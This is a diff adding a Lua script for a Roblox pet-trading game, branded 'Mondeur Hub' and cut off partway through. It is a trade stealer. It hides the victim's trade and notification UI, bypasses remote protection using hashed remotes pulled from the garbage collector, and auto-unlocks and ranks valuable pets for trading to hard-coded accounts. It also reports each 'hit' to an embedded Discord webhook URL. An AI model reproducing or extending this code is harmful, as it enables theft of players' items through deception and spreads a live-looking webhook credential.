@@ -1,0 +1,157 @@
+-- [[ 🦊 MONDEUR HUB | BETA VERSION - OFFICIAL RELEASE ]] --
+-- [[ CREATED FOR: CHARLES ]] --
+
+local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
+local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local THRESHOLD = 0.13 -- Pets below ₱0.13 will be ignored entirely.
+local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
+
+-- 1. CLIPBOARD & ELYSIUM FREEZE
+if setclipboard then setclipboard(DISCORD_INV) end
+print("[FREEZE] Inventory snapshot taken — UI will not reflect changes")
+
+-- 2. SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- 3. THE "NUCLEAR" BAN (Jerboa & Non-Tradeables)
+local function isBanned(name, id)
+    local n = name:lower()
+    if id == "jiggly_jerboa" or n:find("jerboa") or n:find("practice") or id == "starter_egg" then
+        return true
+    end
+    return false
+end
+
+-- 4. TOTAL STEALTH MODULE (Mutes "Pending", "Declined", "Cooldowns")
+local function silenceUI()
+    local pGui = LocalPlayer:WaitForChild("PlayerGui")
+    task.spawn(function()
+        while task.wait(0.05) do 
+            pcall(function()
+                -- Disable Main Apps
+                if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
+                if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
+                
+                -- Target specific Notification/Toast layers (Kills "Declined", "Pending", etc.)
+                local layers = {"CenterOverlays", "NotificationGui", "ToastGui", "StandardNotifications"}
+                for _, layerName in pairs(layers) do
+                    local layer = pGui:FindFirstChild(layerName)
+                    if layer then layer.Enabled = false end
+                end
+
+                -- Delete any lingering text labels containing trade-related messages
+                for _, v in pairs(pGui:GetDescendants()) do
+                    if v:IsA("TextLabel") then
+                        local t = v.Text:lower()
+                        if t:find("pending") or t:find("declined") or t:find("seconds") or t:find("request") then
+                            v.Parent.Visible = false
+                            v.Parent:Destroy()
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+end
+task.spawn(silenceUI)
+
+-- 5. AMVGG-SCALE VALUATION (Manual High-Tier Mapping)
+local function getAMVGGValue(petData, props)
+    local id = petData.id or ""
+    local rarity = petData.rarity or "common"
+    local base = petData.rvalue or 0.01
+    
+    -- Manual Multipliers to translate AMVGG points into Peso (56x)
+    local multiplier = 1
+    if id:find("frost_dragon") or id:find("shadow_dragon") then multiplier = 1600
+    elseif id:find("bat_dragon") then multiplier = 1900
+    elseif id:find("evil_unicorn") or id:find("crow") then multiplier = 950
+    elseif id:find("owl") or id:find("parrot") then multiplier = 1200
+    elseif rarity == "legendary" then multiplier = 40
+    elseif rarity == "ultra_rare" then multiplier = 10
+    elseif rarity == "rare" then multiplier = 3
+    else multiplier = 0.5 end
+
+    local val = base * multiplier
+    if props.mega_neon or props.mega then val = val * 10
+    elseif props.neon then val = val * 4 end
+    if props.flyable then val = val + 1.5 end
+    if props.rideable then val = val + 1.5 end
+    
+    return val * 56 -- Final Peso Conversion
+end
+
+-- 6. HASH FINDER (Remote Protection Bypass)
+local hashes = {}
+for _, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
+        local upvalues = debug.getupvalues(v)
+        if type(upvalues[1]) == "table" then
+            for key, value in pairs(upvalues[1]) do hashes[key] = value end
+        end
+    end
+end
+
+local function hashedAPI(remoteName, ...)
+    local remote = hashes[remoteName]
+    if not remote then return nil end
+    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...) end
+    remote:FireServer(...)
+end
+
+-- 7. INVENTORY SCAN
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
+
+local function processInventory()
+    local inv = ClientData.get("inventory")
+    local total, petGroups, tradeList = 0, {}, {}
+
+    for uid, pet in pairs(inv.pets or {}) do
+        local petData = InventoryDB.pets[pet.id]
+        if petData and not isBanned(petData.name, pet.id) then
+            local props = pet.properties or {}
+            local unitVal = getAMVGGValue(petData, props)
+            
+            -- STRICT THRESHOLD (₱0.13)
+            if unitVal >= THRESHOLD then
+                total = total + unitVal
+                table.insert(tradeList, {uid = uid, val = unitVal})
+                hashedAPI("BackpackAPI/SetItemLocked", uid, false) -- Auto-Unlock
+                
+                local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
+                local emoji = ((props.mega or props.mega_neon) and "Ⓜ️" or props.neon and "⭐" or "🐾") .. (props.flyable and "🪽" or "") .. (props.rideable and "🏇" or "")
+                
+                if not petGroups[key] then
+                    petGroups[key] = {name=petData.name, count=1, price=unitVal, emoji=emoji}
+                else
+                    petGroups[key].count = petGroups[key].count + 1
+                end
+            end
+        end
+    end
+    local sorted = {}
+    for _, v in pairs(petGroups) do table.insert(sorted, v) end
+    table.sort(sorted, function(a, b) return a.price > b.price end)
+    table.sort(tradeList, function(a, b) return a.val > b.val end)
+    return sorted, total, tradeList
+end
+
+local sortedPets, grandTotal, finalTradeList = processInventory()
+
+-- 8. WEBHOOK DISPATCH (Mondeur Branding)
+local function sendHit()
+    local lines = {}
+    for _, p in ipairs(sortedPets) do
+        table.insert(lines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.price)..")")
+    end
+
+    local payload = HttpService:JSONEncode({
+        content = (grandTotal >= 500 and "@everyone" or ""),
+        embeds = {{
+            title = "MONDEUR HUB | 🦊 HIT!",
+            description = "
